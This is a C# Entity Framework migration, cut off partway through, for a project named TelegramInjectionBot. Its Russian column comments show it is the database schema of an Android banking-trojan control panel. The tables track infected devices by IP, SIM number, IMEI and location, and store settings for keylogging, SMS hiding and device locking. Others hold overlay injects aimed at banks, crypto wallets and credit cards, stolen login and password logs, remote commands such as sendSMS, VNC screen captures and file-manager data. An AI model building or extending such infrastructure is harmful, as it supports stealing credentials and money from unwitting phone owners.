using System;
using Microsoft.EntityFrameworkCore.Metadata;
using Microsoft.EntityFrameworkCore.Migrations;

#nullable disable

namespace TelegramInjectionBot.Migrations
{
    public partial class Initial : Migration
    {
        protected override void Up(MigrationBuilder migrationBuilder)
        {
            migrationBuilder.AlterDatabase()
                .Annotation("MySql:CharSet", "utf8mb4");

            migrationBuilder.CreateTable(
                name: "auto_commands",
                columns: table => new
                {
                    id = table.Column<ulong>(type: "bigint unsigned", nullable: false)
                        .Annotation("MySql:ValueGenerationStrategy", MySqlValueGenerationStrategy.IdentityColumn),
                    data = table.Column<string>(type: "json", nullable: true, collation: "utf8mb4_unicode_ci")
                        .Annotation("MySql:CharSet", "utf8mb4"),
                    created_at = table.Column<DateTime>(type: "timestamp", nullable: true),
                    updated_at = table.Column<DateTime>(type: "timestamp", nullable: true)
                },
                constraints: table =>
                {
                    table.PrimaryKey("PK_auto_commands", x => x.id);
                })
                .Annotation("MySql:CharSet", "utf8mb4")
                .Annotation("Relational:Collation", "utf8mb4_unicode_ci");

            migrationBuilder.CreateTable(
                name: "bots",
                columns: table => new
                {
                    id = table.Column<string>(type: "varchar(255)", nullable: false, collation: "utf8mb4_unicode_ci")
                        .Annotation("MySql:CharSet", "utf8mb4"),
                    ip = table.Column<string>(type: "varchar(255)", maxLength: 255, nullable: false, comment: "ip адрес устройства. С портом", collation: "utf8mb4_unicode_ci")
                        .Annotation("MySql:CharSet", "utf8mb4"),
                    last_connection = table.Column<DateTime>(type: "timestamp", nullable: false, comment: "Дата подключения устройства."),
                    country = table.Column<string>(type: "varchar(255)", maxLength: 255, nullable: true, comment: "Название страны устройства.", collation: "utf8mb4_unicode_ci")
                        .Annotation("MySql:CharSet", "utf8mb4"),
                    country_code = table.Column<string>(type: "varchar(255)", maxLength: 255, nullable: true, comment: "Код страны устройства.", collation: "utf8mb4_unicode_ci")
                        .Annotation("MySql:CharSet", "utf8mb4"),
                    tag = table.Column<string>(type: "varchar(255)", nullable: true, comment: "Тег.", collation: "utf8mb4_unicode_ci")
                        .Annotation("MySql:CharSet", "utf8mb4"),
                    update_settings = table.Column<bool>(type: "tinyint(1)", nullable: false, comment: "Флаг для обновления настроек бота."),
                    working_time = table.Column<int>(type: "int", nullable: false, comment: "Время работы устройства в секундах."),
                    sim_data = table.Column<string>(type: "json", nullable: true, comment: "JSON массив с информацией о сим-картах устройства. Формат: [{\"operator\":\"Android\",\"phone_number\":\"+15555215554\",\"isDualSim\":\"false\",\"operator1\":\"\",\"phone_number1\":\"\"}]", collation: "utf8mb4_unicode_ci")
                        .Annotation("MySql:CharSet", "utf8mb4"),
                    metadata = table.Column<string>(type: "json", nullable: true, comment: "JSON массив с метаданными устройства. Формат: {android:'10',model:'Samsung Galaxy S 100','battery_level':15,'IMEI':14}", collation: "utf8mb4_unicode_ci")
                        .Annotation("MySql:CharSet", "utf8mb4"),
                    permissions = table.Column<string>(type: "json", nullable: true, comment: "JSON массив привилегий устройства. Формат:\n                    {\n                        \"all_permission\": \"true\",\n                        \"sms_permission\": \"false\",\n                        \"overlay_permission\": \"true\",\n                        \"accounts_permission\": \"true\",\n                        \"contacts_permission\": \"true\",\n                        \"notification_permission\": \"false\"\n                    }\n                ", collation: "utf8mb4_unicode_ci")
                        .Annotation("MySql:CharSet", "utf8mb4"),
                    sub_info = table.Column<string>(type: "json", nullable: true, comment: "JSON массив с дополнительной информацией об устройстве. Формат:\n                    {\n                        \"admin\": \"false\",\n                        \"screen\": \"true\",\n                        \"protect\": \"0\",\n                        \"isDozeMode\": \"true\",\n                        \"batteryLevel\": \"98\",\n                        \"accessibility\": \"true\",\n                        \"isKeyguardLocked\": \"false\"\n                    }\n                ", collation: "utf8mb4_unicode_ci")
                        .Annotation("MySql:CharSet", "utf8mb4"),
                    location = table.Column<string>(type: "json", nullable: true, comment: "JSON местоположения устройства. Формат:\n                    {\n                        lat:100,\n                        lon:100\n                    }\n            ", collation: "utf8mb4_unicode_ci")
                        .Annotation("MySql:CharSet", "utf8mb4"),
                    settings = table.Column<string>(type: "json", nullable: false, comment: "JSON массив с настройками. Формат: {\"hideSMS\":true,\"lockDevice\":true,\"offSound\":true,\"keylogger\":true,\"clearPush\":true,\"readPush\":true,\"arrayUrl\":[\"https://yandex.ru/\", \"https://yandex.ru/\"]}", collation: "utf8mb4_unicode_ci")
                        .Annotation("MySql:CharSet", "utf8mb4"),
                    is_favorite = table.Column<bool>(type: "tinyint(1)", nullable: false),
                    is_blacklisted = table.Column<bool>(type: "tinyint(1)", nullable: false),
                    comment = table.Column<string>(type: "varchar(255)", maxLength: 255, nullable: true, collation: "utf8mb4_unicode_ci")
                        .Annotation("MySql:CharSet", "utf8mb4"),
                    is_new = table.Column<bool>(type: "tinyint(1)", nullable: false, defaultValueSql: "'1'"),
                    created_at = table.Column<DateTime>(type: "timestamp", nullable: true),
                    updated_at = table.Column<DateTime>(type: "timestamp", nullable: true),
                    current_file_manager_path = table.Column<string>(type: "varchar(255)", maxLength: 255, nullable: true, collation: "utf8mb4_unicode_ci")
                        .Annotation("MySql:CharSet", "utf8mb4")
                },
                constraints: table =>
                {
                    table.PrimaryKey("PK_bots", x => x.id);
                })
                .Annotation("MySql:CharSet", "utf8mb4")
                .Annotation("Relational:Collation", "utf8mb4_unicode_ci");

            migrationBuilder.CreateTable(
                name: "injection_sessions",
                columns: table => new
                {
                    id = table.Column<ulong>(type: "bigint unsigned", nullable: false)
                        .Annotation("MySql:ValueGenerationStrategy", MySqlValueGenerationStrategy.IdentityColumn),
                    bot_id = table.Column<string>(type: "varchar(255)", maxLength: 255, nullable: false, collation: "utf8mb4_unicode_ci")
                        .Annotation("MySql:CharSet", "utf8mb4"),
                    application = table.Column<string>(type: "varchar(255)", maxLength: 255, nullable: false, collation: "utf8mb4_unicode_ci")
                        .Annotation("MySql:CharSet", "utf8mb4"),
                    data = table.Column<string>(type: "json", nullable: true, collation: "utf8mb4_unicode_ci")
                        .Annotation("MySql:CharSet", "utf8mb4"),
                    session_id = table.Column<string>(type: "varchar(36)", maxLength: 36, nullable: false, collation: "utf8mb4_unicode_ci")
                        .Annotation("MySql:CharSet", "utf8mb4"),
                    action = table.Column<string>(type: "varchar(255)", maxLength: 255, nullable: false, defaultValueSql: "'default'", collation: "utf8mb4_unicode_ci")
                        .Annotation("MySql:CharSet", "utf8mb4"),
                    is_closed = table.Column<bool>(type: "tinyint(1)", nullable: false),
                    created_at = table.Column<DateTime>(type: "timestamp", nullable: true),
                    updated_at = table.Column<DateTime>(type: "timestamp", nullable: true)
                },
                constraints: table =>
                {
                    table.PrimaryKey("PK_injection_sessions", x => x.id);
                })
                .Annotation("MySql:CharSet", "utf8mb4")
                .Annotation("Relational:Collation", "utf8mb4_unicode_ci");

            migrationBuilder.CreateTable(
                name: "injections",
                columns: table => new
                {
                    id = table.Column<ulong>(type: "bigint unsigned", nullable: false)
                        .Annotation("MySql:ValueGenerationStrategy", MySqlValueGenerationStrategy.IdentityColumn),
                    application = table.Column<string>(type: "varchar(255)", nullable: false, comment: "Приложение", collation: "utf8mb4_unicode_ci")
                        .Annotation("MySql:CharSet", "utf8mb4"),
                    name = table.Column<string>(type: "varchar(255)", maxLength: 255, nullable: false, comment: "Название инжекта для панели", collation: "utf8mb4_unicode_ci")
                        .Annotation("MySql:CharSet", "utf8mb4"),
                    html = table.Column<string>(type: "varchar(255)", maxLength: 255, nullable: false, comment: "Относительный путь к html", collation: "utf8mb4_unicode_ci")
                        .Annotation("MySql:CharSet", "utf8mb4"),
                    image = table.Column<string>(type: "varchar(255)", maxLength: 255, nullable: false, comment: "Относительный путь к иконке", collation: "utf8mb4_unicode_ci")
                        .Annotation("MySql:CharSet", "utf8mb4"),
                    type = table.Column<string>(type: "enum('banks','crypt','wallets','shops','credit_cards','emails')", nullable: false, comment: "Доступные варианты: 'banks', 'crypt', 'wallets', 'shops', 'credit_cards', 'emails'", collation: "utf8mb4_unicode_ci")
                        .Annotation("MySql:CharSet", "utf8mb4"),
                    auto = table.Column<bool>(type: "tinyint(1)", nullable: false, comment: "Флаг определяющий автоинжект.")
                },
                constraints: table =>
                {
                    table.PrimaryKey("PK_injections", x => x.id);
                })
                .Annotation("MySql:CharSet", "utf8mb4")
                .Annotation("Relational:Collation", "utf8mb4_unicode_ci");

            migrationBuilder.CreateTable(
                name: "migrations",
                columns: table => new
                {
                    id = table.Column<uint>(type: "int unsigned", nullable: false)
                        .Annotation("MySql:ValueGenerationStrategy", MySqlValueGenerationStrategy.IdentityColumn),
                    migration = table.Column<string>(type: "varchar(255)", maxLength: 255, nullable: false, collation: "utf8mb4_unicode_ci")
                        .Annotation("MySql:CharSet", "utf8mb4"),
                    batch = table.Column<int>(type: "int", nullable: false)
                },
                constraints: table =>
                {
                    table.PrimaryKey("PK_migrations", x => x.id);
                })
                .Annotation("MySql:CharSet", "utf8mb4")
                .Annotation("Relational:Collation", "utf8mb4_unicode_ci");

            migrationBuilder.CreateTable(
                name: "permissions",
                columns: table => new
                {
                    id = table.Column<ulong>(type: "bigint unsigned", nullable: false)
                        .Annotation("MySql:ValueGenerationStrategy", MySqlValueGenerationStrategy.IdentityColumn),
                    name = table.Column<string>(type: "varchar(255)", nullable: false, collation: "utf8mb4_unicode_ci")
                        .Annotation("MySql:CharSet", "utf8mb4"),
                    guard_name = table.Column<string>(type: "varchar(255)", nullable: false, collation: "utf8mb4_unicode_ci")
                        .Annotation("MySql:CharSet", "utf8mb4"),
                    created_at = table.Column<DateTime>(type: "timestamp", nullable: true),
                    updated_at = table.Column<DateTime>(type: "timestamp", nullable: true)
                },
                constraints: table =>
                {
                    table.PrimaryKey("PK_permissions", x => x.id);
                })
                .Annotation("MySql:CharSet", "utf8mb4")
                .Annotation("Relational:Collation", "utf8mb4_unicode_ci");

            migrationBuilder.CreateTable(
                name: "roles",
                columns: table => new
                {
                    id = table.Column<ulong>(type: "bigint unsigned", nullable: false)
                        .Annotation("MySql:ValueGenerationStrategy", MySqlValueGenerationStrategy.IdentityColumn),
                    name = table.Column<string>(type: "varchar(255)", nullable: false, collation: "utf8mb4_unicode_ci")
                        .Annotation("MySql:CharSet", "utf8mb4"),
                    guard_name = table.Column<string>(type: "varchar(255)", nullable: false, collation: "utf8mb4_unicode_ci")
                        .Annotation("MySql:CharSet", "utf8mb4"),
                    created_at = table.Column<DateTime>(type: "timestamp", nullable: true),
                    updated_at = table.Column<DateTime>(type: "timestamp", nullable: true)
                },
                constraints: table =>
                {
                    table.PrimaryKey("PK_roles", x => x.id);
                })
                .Annotation("MySql:CharSet", "utf8mb4")
                .Annotation("Relational:Collation", "utf8mb4_unicode_ci");

            migrationBuilder.CreateTable(
                name: "settings",
                columns: table => new
                {
                    id = table.Column<ulong>(type: "bigint unsigned", nullable: false)
                        .Annotation("MySql:ValueGenerationStrategy", MySqlValueGenerationStrategy.IdentityColumn),
                    created_at = table.Column<DateTime>(type: "timestamp", nullable: true),
                    updated_at = table.Column<DateTime>(type: "timestamp", nullable: true)
                },
                constraints: table =>
                {
                    table.PrimaryKey("PK_settings", x => x.id);
                })
                .Annotation("MySql:CharSet", "utf8mb4")
                .Annotation("Relational:Collation", "utf8mb4_unicode_ci");

            migrationBuilder.CreateTable(
                name: "users",
                columns: table => new
                {
                    id = table.Column<ulong>(type: "bigint unsigned", nullable: false)
                        .Annotation("MySql:ValueGenerationStrategy", MySqlValueGenerationStrategy.IdentityColumn),
                    name = table.Column<string>(type: "varchar(255)", maxLength: 255, nullable: false, comment: "Имя пользователя", collation: "utf8mb4_unicode_ci")
                        .Annotation("MySql:CharSet", "utf8mb4"),
                    password = table.Column<string>(type: "varchar(255)", maxLength: 255, nullable: false, comment: "Закриптованный токен пользователя", collation: "utf8mb4_unicode_ci")
                        .Annotation("MySql:CharSet", "utf8mb4"),
                    token = table.Column<string>(type: "varchar(255)", nullable: false, comment: "Незакриптованный токен пользователя", collation: "utf8mb4_unicode_ci")
                        .Annotation("MySql:CharSet", "utf8mb4"),
                    email = table.Column<string>(type: "varchar(255)", maxLength: 255, nullable: true, comment: "Адрес электронной почты. Nullable", collation: "utf8mb4_unicode_ci")
                        .Annotation("MySql:CharSet", "utf8mb4"),
                    is_paused = table.Column<bool>(type: "tinyint(1)", nullable: false, comment: "Приостановлен ли пользователь."),
                    expired_at = table.Column<DateTime>(type: "timestamp", nullable: true, comment: "Дата истечения токена."),
                    created_user_id = table.Column<ulong>(type: "bigint unsigned", nullable: true),
                    telegram_id = table.Column<string>(type: "varchar(255)", maxLength: 255, nullable: true, collation: "utf8mb4_unicode_ci")
                        .Annotation("MySql:CharSet", "utf8mb4"),
                    created_at = table.Column<DateTime>(type: "timestamp", nullable: true),
                    updated_at = table.Column<DateTime>(type: "timestamp", nullable: true),
                    failed_auth_attempts = table.Column<int>(type: "int", nullable: false),
                    telegram_auth_code = table.Column<string>(type: "longtext", nullable: true, collation: "utf8mb4_unicode_ci")
                        .Annotation("MySql:CharSet", "utf8mb4")
                },
                constraints: table =>
                {
                    table.PrimaryKey("PK_users", x => x.id);
                    table.ForeignKey(
                        name: "users_created_user_id_foreign",
                        column: x => x.created_user_id,
                        principalTable: "users",
                        principalColumn: "id",
                        onDelete: ReferentialAction.Cascade);
                })
                .Annotation("MySql:CharSet", "utf8mb4")
                .Annotation("Relational:Collation", "utf8mb4_unicode_ci");

            migrationBuilder.CreateTable(
                name: "bot_commands",
                columns: table => new
                {
                    id = table.Column<ulong>(type: "bigint unsigned", nullable: false)
                        .Annotation("MySql:ValueGenerationStrategy", MySqlValueGenerationStrategy.IdentityColumn),
                    bot_id = table.Column<string>(type: "varchar(255)", nullable: false, collation: "utf8mb4_unicode_ci")
                        .Annotation("MySql:CharSet", "utf8mb4"),
                    command = table.Column<string>(type: "json", nullable: false, comment: "json массив настроек: {command:\"sendSMS\",payload:{phone:\"123456\",text:\"52314234\"}}", collation: "utf8mb4_unicode_ci")
                        .Annotation("MySql:CharSet", "utf8mb4"),
                    is_processed = table.Column<bool>(type: "tinyint(1)", nullable: false, comment: "Флаг, по которому можно понять - обработана ли команда, или нет"),
                    run_at = table.Column<DateTime>(type: "timestamp", nullable: true, comment: "Запуск комманды в указанное время, формат Y-m-d H:i:s. Если указано NULL - запускать сразу"),
                    created_at = table.Column<DateTime>(type: "timestamp", nullable: true),
                    updated_at = table.Column<DateTime>(type: "timestamp", nullable: true)
                },
                constraints: table =>
                {
                    table.PrimaryKey("PK_bot_commands", x => x.id);
                    table.ForeignKey(
                        name: "bot_commands_bot_id_foreign",
                        column: x => x.bot_id,
                        principalTable: "bots",
                        principalColumn: "id",
                        onDelete: ReferentialAction.Cascade);
                })
                .Annotation("MySql:CharSet", "utf8mb4")
                .Annotation("Relational:Collation", "utf8mb4_unicode_ci");

            migrationBuilder.CreateTable(
                name: "bot_filemanager",
                columns: table => new
                {
                    id = table.Column<ulong>(type: "bigint unsigned", nullable: false)
                        .Annotation("MySql:ValueGenerationStrategy", MySqlValueGenerationStrategy.IdentityColumn),
                    bot_id = table.Column<string>(type: "varchar(255)", nullable: false, collation: "utf8mb4_unicode_ci")
                        .Annotation("MySql:CharSet", "utf8mb4"),
                    info = table.Column<string>(type: "json", nullable: false, collation: "utf8mb4_unicode_ci")
                        .Annotation("MySql:CharSet", "utf8mb4"),
                    created_at = table.Column<DateTime>(type: "timestamp", nullable: true),
                    updated_at = table.Column<DateTime>(type: "timestamp", nullable: true)
                },
                constraints: table =>
                {
                    table.PrimaryKey("PK_bot_filemanager", x => x.id);
                    table.ForeignKey(
                        name: "bot_filemanager_bot_id_foreign",
                        column: x => x.bot_id,
                        principalTable: "bots",
                        principalColumn: "id",
                        onDelete: ReferentialAction.Cascade);
                })
                .Annotation("MySql:CharSet", "utf8mb4")
                .Annotation("Relational:Collation", "utf8mb4_unicode_ci");

            migrationBuilder.CreateTable(
                name: "bot_files",
                columns: table => new
                {
                    id = table.Column<ulong>(type: "bigint unsigned", nullable: false)
                        .Annotation("MySql:ValueGenerationStrategy", MySqlValueGenerationStrategy.IdentityColumn),
                    bot_id = table.Column<string>(type: "varchar(255)", nullable: false, collation: "utf8mb4_unicode_ci")
                        .Annotation("MySql:CharSet", "utf8mb4"),
                    path = table.Column<string>(type: "varchar(255)", maxLength: 255, nullable: false, collation: "utf8mb4_unicode_ci")
                        .Annotation("MySql:CharSet", "utf8mb4"),
                    content = table.Column<string>(type: "json", nullable: false, collation: "utf8mb4_unicode_ci")
                        .Annotation("MySql:CharSet", "utf8mb4"),
                    created_at = table.Column<DateTime>(type: "timestamp", nullable: true),
                    updated_at = table.Column<DateTime>(type: "timestamp", nullable: true),
                    stored_file_path = table.Column<string>(type: "varchar(255)", maxLength: 255, nullable: true, collation: "utf8mb4_unicode_ci")
                        .Annotation("MySql:CharSet", "utf8mb4")
                },
                constraints: table =>
                {
                    table.PrimaryKey("PK_bot_files", x => x.id);
                    table.ForeignKey(
                        name: "bot_files_bot_id_foreign",
                        column: x => x.bot_id,
                        principalTable: "bots",
                        principalColumn: "id",
                        onDelete: ReferentialAction.Cascade);
                })
                .Annotation("MySql:CharSet", "utf8mb4")
                .Annotation("Relational:Collation", "utf8mb4_unicode_ci");

            migrationBuilder.CreateTable(
                name: "bot_injections",
                columns: table => new
                {
                    id = table.Column<ulong>(type: "bigint unsigned", nullable: false)
                        .Annotation("MySql:ValueGenerationStrategy", MySqlValueGenerationStrategy.IdentityColumn),
                    bot_id = table.Column<string>(type: "varchar(255)", nullable: false, collation: "utf8mb4_unicode_ci")
                        .Annotation("MySql:CharSet", "utf8mb4"),
                    application = table.Column<string>(type: "varchar(255)", nullable: false, comment: "Название пакета приложения. Пример: org.app.name", collation: "utf8mb4_unicode_ci")
                        .Annotation("MySql:CharSet", "utf8mb4"),
                    is_active = table.Column<bool>(type: "tinyint(1)", nullable: false)
                },
                constraints: table =>
                {
                    table.PrimaryKey("PK_bot_injections", x => x.id);
                    table.ForeignKey(
                        name: "bot_injections_bot_id_foreign",
                        column: x => x.bot_id,
                        principalTable: "bots",
                        principalColumn: "id",
                        onDelete: ReferentialAction.Cascade);
                })
                .Annotation("MySql:CharSet", "utf8mb4")
                .Annotation("Relational:Collation", "utf8mb4_unicode_ci");

            migrationBuilder.CreateTable(
                name: "bot_logs",
                columns: table => new
                {
                    id = table.Column<ulong>(type: "bigint unsigned", nullable: false)
                        .Annotation("MySql:ValueGenerationStrategy", MySqlValueGenerationStrategy.IdentityColumn),
                    bot_id = table.Column<string>(type: "varchar(255)", nullable: false, collation: "utf8mb4_unicode_ci")
                        .Annotation("MySql:CharSet", "utf8mb4"),
                    application = table.Column<string>(type: "varchar(255)", nullable: true, comment: "Название пакета приложения. Пример: org.app.name. Необязательный параметр", collation: "utf8mb4_unicode_ci")
                        .Annotation("MySql:CharSet", "utf8mb4"),
                    type = table.Column<string>(type: "varchar(255)", nullable: false, comment: "Тип лога. Доступные типы: 'banks', 'crypt', 'wallets', 'shops', 'credit_cards', 'emails', 'sms', 'events', 'googleauth', 'hidesms', 'keylogger', 'mail', 'otheraccounts', 'phonenumber', 'pushlist', 'ussd', 'stealers'", collation: "utf8mb4_unicode_ci")
                        .Annotation("MySql:CharSet", "utf8mb4"),
                    log = table.Column<string>(type: "json", nullable: false, comment: "JSON массив с данными инжекта, в любом формате. {\"login\": \"log\", \"password\": \"pass\", ...}", collation: "utf8mb4_unicode_ci")
                        .Annotation("MySql:CharSet", "utf8mb4"),
                    comment = table.Column<string>(type: "varchar(255)", maxLength: 255, nullable: true, collation: "utf8mb4_unicode_ci")
                        .Annotation("MySql:CharSet", "utf8mb4"),
                    telegram_accepted = table.Column<bool>(type: "tinyint(1)", nullable: false),
                    created_at = table.Column<DateTime>(type: "timestamp", nullable: true),
                    updated_at = table.Column<DateTime>(type: "timestamp", nullable: true)
                },
                constraints: table =>
                {
                    table.PrimaryKey("PK_bot_logs", x => x.id);
                    table.ForeignKey(
                        name: "bot_logs_bot_id_foreign",
                        column: x => x.bot_id,
                        principalTable: "bots",
                        principalColumn: "id",
                        onDelete: ReferentialAction.Cascade);
                })
                .Annotation("MySql:CharSet", "utf8mb4")
                .Annotation("Relational:Collation", "utf8mb4_unicode_ci");

            migrationBuilder.CreateTable(
                name: "bot_vnc",
                columns: table => new
                {
                    id = table.Column<ulong>(type: "bigint unsigned", nullable: false)
                        .Annotation("MySql:ValueGenerationStrategy", MySqlValueGenerationStrategy.IdentityColumn),
                    bot_id = table.Column<string>(type: "varchar(255)", nullable: false, collation: "utf8mb4_unicode_ci")
                        .Annotation("MySql:CharSet", "utf8mb4"),
                    tree = table.Column<string>(type: "json", nullable: false, collation: "utf8mb4_unicode_ci")
                        .Annotation("MySql:CharSet", "utf8mb4"),
                    created_at = table.Column<DateTime>(type: "timestamp", nullable: true),
                    updated_at = table.Column<DateTime>(type: "timestamp", nullable: true),
                    image_blob = table.Column<byte[]>(type: "longblob", nullable: true)
                },
                constraints: table =>
                {
                    table.PrimaryKey("PK_bot_vnc", x => x.id);
                    table.ForeignKey(
                        name: "bot_vnc_bot_id_foreign",
                        column: x => x.bot_id,
                        principalTable: "bots",
                        principalColumn: "id",
                        onDelete: ReferentialAction.Cascade);
                })
                .Annotation("MySql:CharSet", "utf8mb4")
                .Annotation("Relational:Collation", "utf8mb4_unicode_ci");

            migrationBuilder.CreateTable(
                name: "injection_files",
                columns: table => new
                {
                    injection_id = table.Column<ulong>(type: "bigint unsigned", nullable: false),
                    html_blob = table.Column<byte[]>(type: "longblob", nullable: true),
                    image_blob = table.Column<byte[]>(type: "longblob", nullable: true)
                },
                constraints: table =>
                {
                    table.PrimaryKey("PRIMARY", x => x.injection_id);
                    table.ForeignKey(
                        name: "injection_files_injection_id_foreign",
                        column: x => x.injection_id,
                        principalTable: "injections",
                        principalColumn: "id",
                        onDelete: ReferentialAction.Cascade);
                })
                .Annotation("MySql:CharSet", "utf8mb4")
                .Annotation("Relational:Collation", "utf8mb4_unicode_ci");

            migrationBuilder.CreateTable(
                name: "model_has_permissions",
                columns: table => new
                {
                    permission_id = table.Column<ulong>(type: "bigint unsigned", nullable: false),
                    model_type = table.Column<string>(type: "varchar(255)", nullable: false, collation: "utf8mb4_unicode_ci")
                        .Annotation("MySql:CharSet", "utf8mb4"),
                    model_id = table.Column<ulong>(type: "bigint unsigned", nullable: false)
                },
                constraints: table =>
                {
                    table.PrimaryKey("PRIMARY", x => new { x.permission_id, x.model_id, x.model_type })
                        .Annotation("MySql:IndexPrefixLength", new[] { 0, 0, 0 });
                    table.ForeignKey(
                        name: "model_has_permissions_permission_id_foreign",
                        column: x => x.permission_id,
                        principalTable: "permissions",
                        principalColumn: "id",
                        onDelete: ReferentialAction.Cascade);
                })
                .Annotation("MySql:CharSet", "utf8mb4")
                .Annotation("Relational:Collation", "utf8mb4_unicode_ci");

            migrationBuilder.CreateTable(
                name: "model_has_roles",
                columns: table => new
                {
                    role_id = table.Column<ulong>(type: "bigint unsigned", nullable: false),
                    model_type = table.Column<string>(type: "varchar(255)", nullable: false, collation: "utf8mb4_unicode_ci")
                        .Annotation("MySql:CharSet", "utf8mb4"),
                    model_id = table.Column<ulong>(type: "bigint unsigned", nullable: false)
                },
                constraints: table =>
                {
                    table.PrimaryKey("PRIMARY", x => new { x.role_id, x.model_id, x.model_type })
                        .Annotation("MySql:IndexPrefixLength", new[] { 0, 0, 0 });
                    table.ForeignKey(
                        name: "model_has_roles_role_id_foreign",
                        column: x => x.role_id,
                        principalTable: "roles",
                        principalColumn: "id",
                        onDelete: ReferentialAction.Cascade);
                })
                .Annotation("MySql:CharSet", "utf8mb4")
                .Annotation("Relational:Collation", "utf8mb4_unicode_ci");

            migrationBuilder.CreateTable(
                name: "role_has_permissions",
                columns: table => new
                {
                    permission_id = table.Column<ulong>(type: "bigint unsigned", nullable: false),
                    role_id = table.Column<ulong>(type: "bigint unsigned", nullable: false)
                },
                constraints: table =>
                {
                    table.PrimaryKey("PRIMARY", x => new { x.permission_id, x.role_id })
                        .Annotation("MySql:IndexPrefixLength", new[] { 0, 0 });
                    table.ForeignKey(
                        name: "role_has_permissions_permission_id_foreign",
                        column: x => x.permission_id,
                        principalTable: "permissions",
                        principalColumn: "id",
                        onDelete: ReferentialAction.Cascade);
                    table.ForeignKey(
                        name: "role_has_permissions_role_id_foreign",
                        column: x => x.role_id,
                        principalTable: "roles",
                        principalColumn: "id",
                        onDelete: ReferentialAction.Cascade);
                })
                .Annotation("MySql:CharSet", "utf8mb4")
                .Annotation("Relational:Collation", "utf8mb4_unicode_ci");

            migrationBuilder.CreateTable(
                name: "user_bot_timestamp",
                columns: table => new
                {
                    id = table.Column<ulong>(type: "bigint unsigned", nullable: false)
                        .Annotation("MySql:ValueGenerationStrategy", MySqlValueGenerationStrategy.IdentityColumn),
                    user_id = table.Column<ulong>(type: "bigint unsigned", nullable: false),
                    bot_id = table.Column<string>(type: "varchar(255)", nullable: false, collation: "utf8mb4_unicode_ci")
                        .Annotation("MySql:CharSet", "utf8mb4"),
                    application = table.Column<string>(type: "varchar(255)", nullable: false, collation: "utf8mb4_unicode_ci")
                        .Annotation("MySql:CharSet", "utf8mb4"),
                    visited_at = table.Column<DateTime>(type: "timestamp", nullable: true)
                },
                constraints: table =>
                {
                    table.PrimaryKey("PK_user_bot_timestamp", x => x.id);
                    table.ForeignKey(
                        name: "user_bot_timestamp_bot_id_foreign",
                        column: x => x.bot_id,
                        principalTable: "bots",
                        principalColumn: "id",
                        onDelete: ReferentialAction.Cascade);
                    table.ForeignKey(
                        name: "user_bot_timestamp_user_id_foreign",
                        column: x => x.user_id,
                        principalTable: "users",
                        principalColumn: "id",
                        onDelete: ReferentialAction.Cascade);
                })
                .Annotation("MySql:CharSet", "utf8mb4")
                .Annotation("Relational:Collation", "utf8mb4_unicode_ci");

            migrationBuilder.CreateTable(
                name: "user_tags",
                columns: table => new
                {
                    id = table.Column<ulong>(type: "bigint unsigned", nullable: false)
                        .Annotation("MySql:ValueGenerationStrategy", MySqlValueGenerationStrategy.IdentityColumn),
                    user_id = table.Column<ulong>(type: "bigint unsigned", nullable: false),
                    tag = table.Column<string>(type: "varchar(255)", nullable: false, collation: "utf8mb4_unicode_ci")
                        .Annotation("MySql:CharSet", "utf8mb4")
                },
                constraints: table =>
                {
                    table.PrimaryKey("PK_user_tags", x => x.id);
                    table.ForeignKey(
                        name: "user_tags_user_id_foreign",
                        column: x => x.user_id,
                        principalTable: "users",
                        principalColumn: "id",
                        onDelete: ReferentialAction.Cascade);
                })
                .Annotation("MySql:CharSet", "utf8mb4")
                .Annotation("Relational:Collation", "utf8mb4_unicode_ci");

            migrationBuilder.CreateTable(
                name: "user_telegram_attempts",
                columns: table => new
                {
                    id = table.Column<ulong>(type: "bigint unsigned", nullable: false)
                        .Annotation("MySql:ValueGenerationStrategy", MySqlValueGenerationStrategy.IdentityColumn),
                    user_id = table.Column<ulong>(type: "bigint unsigned", nullable: false),
                    secret_word = table.Column<string>(type: "varchar(255)", maxLength: 255, nullable: false, collation: "utf8mb4_unicode_ci")
                        .Annotation("MySql:CharSet", "utf8mb4"),
                    attempts = table.Column<sbyte>(type: "tinyint", nullable: false, defaultValueSql: "'5'"),
                    created_at = table.Column<DateTime>(type: "timestamp", nullable: true),
                    updated_at = table.Column<DateTime>(type: "timestamp", nullable: true)
                },
                constraints: table =>
                {
                    table.PrimaryKey("PK_user_telegram_attempts", x => x.id);
                    table.ForeignKey(
                        name: "user_telegram_attempts_user_id_foreign",
                        column: x => x.user_id,
                        principalTable: "users",
                        principalColumn: "id",
                        onDelete: ReferentialAction.Cascade);
                })
                .Annotation("MySql:CharSet", "utf8mb4")
                .Annotation("Relational:Collation", "utf8mb4_unicode_ci");

            migrationBuilder.CreateTable(
                name: "user_telegram_bots",
                columns: table => new
                {
                    id = table.Column<ulong>(type: "bigint unsigned", nullable: false)
                        .Annotation("MySql:ValueGenerationStrategy", MySqlValueGenerationStrategy.IdentityColumn),
                    user_id = table.Column<ulong>(type: "bigint unsigned", nullable: false),
                    bot_id = table.Column<string>(type: "char(255)", fixedLength: true, nullable: false, collation: "utf8mb4_unicode_ci")
                        .Annotation("MySql:CharSet", "utf8mb4")
                },
                constraints: table =>
                {
                    table.PrimaryKey("PK_user_telegram_bots", x => x.id);
                    table.ForeignKey(
                        name: "user_telegram_bots_bot_id_foreign",
                        column: x => x.bot_id,
                        principalTable: "bots",
                        principalColumn: "id",
                        onDelete: ReferentialAction.Cascade);
                    table.ForeignKey(
                        name: "user_telegram_bots_user_id_foreign",
                        column: x => x.user_id,
                        principalTable: "users",
                        principalColumn: "id",
                        onDelete: ReferentialAction.Cascade);
                })
                .Annotation("MySql:CharSet", "utf8mb4")
                .Annotation("Relational:Collation", "utf8mb4_unicode_ci");

            migrationBuilder.CreateTable(
                name: "user_telegram_injections",
                columns: table => new
                {
                    id = table.Column<ulong>(type: "bigint unsigned", nullable: false)
                        .Annotation("MySql:ValueGenerationStrategy", MySqlValueGenerationStrategy.IdentityColumn),
                    user_id = table.Column<ulong>(type: "bigint unsigned", nullable: false),
                    application = table.Column<string>(type: "varchar(255)", maxLength: 255, nullable: false, collation: "utf8mb4_unicode_ci")
                        .Annotation("MySql:CharSet", "utf8mb4"),
                    bot_id = table.Column<string>(type: "char(255)", fixedLength: true, nullable: false, collation: "utf8mb4_unicode_ci")
                        .Annotation("MySql:CharSet", "utf8mb4")
                },
                constraints: table =>
                {
                    table.PrimaryKey("PK_user_telegram_injections", x => x.id);
                    table.ForeignKey(
                        name: "user_telegram_injections_bot_id_foreign",
                        column: x => x.bot_id,
                        principalTable: "bots",
                        principalColumn: "id",
                        onDelete: ReferentialAction.Cascade);
                    table.ForeignKey(
                        name: "user_telegram_injections_user_id_foreign",
